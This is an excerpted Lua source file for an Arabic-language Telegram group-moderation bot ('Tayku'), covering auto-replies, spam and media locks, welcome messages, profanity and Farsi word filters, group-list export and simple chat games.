if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevLeo:get(Tayku..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevLeo:get(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevLeo:get(Tayku..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
...
getUser(msg.sender_user_id_, TaykuTeam)
end
end
--     Source Tayku     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevLeo:get(Tayku.."Rio:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevLeo:get(Tayku..'DelSudoRep')
DevLeo:del(Tayku.."Rio:Sudo:AllRed",DelSudoRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevLeo:del(Tayku.."Rio:Add:AllText"..msg.sender_user_id_)
DevLeo:del(Tayku.."Rio:Add:AllRed"..msg.sender_user_id_)
DevLeo:del(Tayku.."DelSudoRep")
return false
end
DevLeo:del(Tayku.."Rio:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevLeo:get(Tayku.."Rio:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevLeo:set(Tayku.."Rio:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevLeo:set(Tayku.."Rio:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevLeo:set(Tayku.."Rio:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevLeo:set(Tayku.."Rio:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevLeo:set(Tayku.."Rio:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
DevLeo:set(Tayku.."Rio:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevLeo:set(Tayku.."Rio:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevLeo:set(Tayku.."Rio:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevLeo:del(Tayku.."Rio:Add:AllText"..msg.sender_user_id_)
DevLeo:del(Tayku..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevLeo:get(Tayku..'Rio:Lock:AllRed'..msg.chat_id_) then
if DevLeo:get(Tayku.."Rio:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevLeo:get(Tayku.."Rio:Video:AllRed"..msg.content_.text_))
end
if DevLeo:get(Tayku.."Rio:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevLeo:get(Tayku.."Rio:File:AllRed"..msg.content_.text_))
end
if DevLeo:get(Tayku.."Rio:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevLeo:get(Tayku.."Rio:Voice:AllRed"..msg.content_.text_))
end
if DevLeo:get(Tayku.."Rio:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevLeo:get(Tayku.."Rio:Audio:AllRed"..msg.content_.text_))
end
if DevLeo:get(Tayku.."Rio:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevLeo:get(Tayku.."Rio:Photo:AllRed"..msg.content_.text_))
end
if  DevLeo:get(Tayku.."Rio:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevLeo:get(Tayku.."Rio:Gif:AllRed"..msg.content_.text_))
end
if DevLeo:get(Tayku.."Rio:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevLeo:get(Tayku.."Rio:Stecker:AllRed"..msg.content_.text_))
end
if DevLeo:get(Tayku.."Rio:Text:AllRed"..msg.content_.text_) then
function TaykuTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevLeo:get(Tayku..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevLeo:get(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevLeo:get(Tayku.."Rio:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "keed" and not DevLeo:sismember(Tayku..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
...
if Type == "mute" and not DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevLeo:sadd(Tayku..'Rio:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
--     Source Tayku     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= Tayku then
floods = DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevLeo:get(Tayku.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevLeo:setex(Tayku.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source Tayku     --
...
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(Tayku) then
DevLeo:set(Tayku..'Rio:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevLeo:get(Tayku..'Rio:PinnedMsg'..msg.chat_id_)
if pin_id and DevLeo:get(Tayku..'Rio:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevLeo:get(Tayku..'Rio:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevLeo:del(Tayku..'Rio:viewget'..msg.sender_user_id_)
else
...
if DevLeo:get(Tayku..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevLeo:get(Tayku..'Rio:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevLeo:get(Tayku..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevLeo:get(Tayku..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevLeo:get(Tayku..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevLeo:get(Tayku..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevLeo:get(Tayku..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevLeo:get(Tayku..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if DevLeo:get(Tayku..'Rio:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevLeo:get(Tayku..'Rio:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if DevLeo:get(Tayku..'Rio:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Tayku     --
...
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevLeo:get(Tayku..'Rio:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevLeo:get(Tayku..'Rio:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevLeo:get(Tayku..'Rio:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@lllEll0]'))
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevLeo:get(Tayku.."Rio:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source Tayku     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevLeo:get(Tayku..'Rio:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Tayku,offset_ = 0,limit_ = 1},function(extra,rio,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(Tayku) then 
if DevLeo:sismember(Tayku..'Rio:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n᥀︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n᥀︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevLeo:get(Tayku.."Rio:Text:BotWelcome") then RioText = DevLeo:get(Tayku.."Rio:Text:BotWelcome") else RioText = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉" end 
if DevLeo:get(Tayku.."Rio:Photo:BotWelcome") then RioPhoto = DevLeo:get(Tayku.."Rio:Photo:BotWelcome") elseif rio.photos_[0] then RioPhoto = rio.photos_[0].sizes_[1].photo_.persistent_id_ else RioPhoto = nil end 
...
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@lllEll0]'))
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     Source Tayku     --
--        Contact         --
...
if DevLeo:get(Tayku..'Rio:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Tayku     --
...
if DevLeo:get(Tayku..'Rio:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevLeo:get(Tayku..'Rio:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevLeo:get(Tayku..'Rio:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if DevLeo:get(Tayku..'Rio:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevLeo:get(Tayku..'Rio:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevLeo:get(Tayku..'Rio:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not DevLeo:get(Tayku..'Rio:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevLeo:get(Tayku..'Rio:Spam:Text'..msg.chat_id_))
end
if DevLeo:get(Tayku..'Rio:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
--     Source Tayku     --
if DevLeo:get(Tayku.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"᥀︙تم الغاء حفظ الرابط")       
DevLeo:del(Tayku.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevLeo:set(Tayku.."Rio:Groups:Links"..msg.chat_id_,Link)
...
if DevLeo:get('TaykuTeam:'..Tayku.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevLeo:del('TaykuTeam:'..Tayku..'id:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevLeo:del('TaykuTeam:'..Tayku.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevLeo:del('TaykuTeam:'..Tayku.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevLeo:get('TaykuTeam:'..Tayku..'id:user'..msg.chat_id_)  
DevLeo:incrby(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Rio(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' رساله', 1, 'md')
DevLeo:del('TaykuTeam:'..Tayku..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevLeo:get('TaykuTeam:'..Tayku.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevLeo:del('TaykuTeam:'..Tayku..'ids:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevLeo:del('TaykuTeam:'..Tayku.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevLeo:del('TaykuTeam:'..Tayku.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevLeo:get('TaykuTeam:'..Tayku..'ids:user'..msg.chat_id_)  
DevLeo:incrby(Tayku..'Rio:GamesNumber'..msg.chat_id_..iduserr,numadded)  
...
if not DevLeo:get(Tayku.."Rio:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if DevLeo:get(Tayku.."Rio:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevLeo:get(Tayku.."Rio:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevLeo:get(Tayku.."Rio:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not DevLeo:get(Tayku.."Rio:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
local List = DevLeo:smembers(Tayku..'Rio:Groups') 
local BotName = (DevLeo:get(Tayku.."Rio:NameBot") or 'تايكو')
local GetJson = '{"BotId": '..Tayku..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevLeo:get(Tayku.."Rio:Groups:Links"..v)
Welcomes = DevLeo:get(Tayku..'Rio:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
RioConstructors = DevLeo:smembers(Tayku..'Rio:RioConstructor:'..v)
Constructors = DevLeo:smembers(Tayku..'Rio:BasicConstructor:'..v)
BasicConstructors = DevLeo:smembers(Tayku..'Rio:Constructor:'..v)
Managers = DevLeo:smembers(Tayku..'Rio:Managers:'..v)
Admis = DevLeo:smembers(Tayku..'Rio:Admins:'..v)
Vips = DevLeo:smembers(Tayku..'Rio:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
...
GetJson = GetJson..'}}'
local File = io.open('./'..Tayku..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..Tayku..'.json', '᥀︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..Tayku..'.json')
end
...
--     Source Tayku     --
if DevLeo:get(Tayku.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Rio( msg.chat_id_, msg.id_, 1,"᥀︙يوجد فقط ( 6 ) اختيارات\n᥀︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevLeo:get(Tayku.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevLeo:del(Tayku.."SET:GAME"..msg.chat_id_)   
Dev_Rio( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevLeo:incrby(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
...
if DevLeo:get(Tayku..'DevLeo4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "᥀︙تم الغاء الامر")
DevLeo:del(Tayku..'DevLeo4'..msg.sender_user_id_)
return false  end 
DevLeo:del(Tayku..'DevLeo4'..msg.sender_user_id_)
...
DevLeo:set(Tayku..'Rio:ChId',data.id_)
else
...
--     Source Tayku     --
if DevLeo:get(Tayku.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevLeo:del(Tayku.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
DevLeo:del(Tayku.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevLeo:set(Tayku.."DevText", DevText)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ كليشة المطور", 1, "md")
end
if DevLeo:get(Tayku..'Rio:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevLeo:del(Tayku..'Rio:NameBot'..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ اسم البوت ', 1, 'html')
DevLeo:del(Tayku..'Rio:NameBot'..msg.sender_user_id_)
DevLeo:set(Tayku..'Rio:NameBot', text)
return false 
end
--     Source Tayku     --
if text == "الرابط" then
if not DevLeo:get(Tayku..'Rio:Lock:GpLinks'..msg.chat_id_) then 
if DevLeo:get(Tayku.."Rio:Groups:Links"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevLeo:get(Tayku.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
else 
...
--     Source Tayku     --
if text == "الرابط" then
if not DevLeo:get(Tayku.."Rio:Lock:GpLinksinline"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
if DevLeo:get(Tayku.."Rio:Groups:Links"..msg.chat_id_) then
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevLeo:get(Tayku.."Rio:Groups:Links"..msg.chat_id_)
...
NameBot = (DevLeo:get(Tayku..'Rio:NameBot') or 'تايكو')
local TaykuTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
DevLeo2 = math.random(#TaykuTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam[DevLeo2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevLeo:get(Tayku..'Rio:NameBot') or 'تايكو') 
local TaykuTeam = {"اسمي القميل "..NameBot.." "} 
DevLeo2 = math.random(#TaykuTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam[DevLeo2] , 1, 'html') 
return false
end
if text and text == (DevLeo:get(Tayku..'Rio:NameBot') or 'تايكو') then 
NameBot = (DevLeo:get(Tayku..'Rio:NameBot') or 'تايكو')
...
if tonumber((DevLeo:get(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد النقاط التي ربحتها ↫ '..(DevLeo:get(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevLeo:del(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevLeo:del(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع نقاطك', 1, 'md') end
--     Source Tayku     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ᥀' and ChCheck(msg) then
if not DevLeo:get(Tayku..'Rio:Lock:Games'..msg.chat_id_) then
DevLeo2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevLeo2[math.random(#DevLeo2)]
DevLeo:set(Tayku..'Rio:GameNum'..msg.chat_id_,name)
DevLeo:del(Tayku..'Rio:Games:Ids'..msg.chat_id_)
...
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
TaykuTeam = '᥀︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
return false
end end
if text == DevLeo:get(Tayku..'Rio:GameNum'..msg.chat_id_) and not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then
if not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then 
TaykuTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
DevLeo:incrby(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevLeo:set(Tayku..'Rio:Games:Ids'..msg.chat_id_,true)
end
...
TaykuTeam = '᥀︙اول واحد يرتبها يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
return false
end end
if text == DevLeo:get(Tayku..'Rio:GameNum'..msg.chat_id_) and not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then
...
if not DevLeo:get(Tayku..'Rio:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevLeo:set(Tayku.."GAMES"..msg.chat_id_,Num) 
TEST = [[
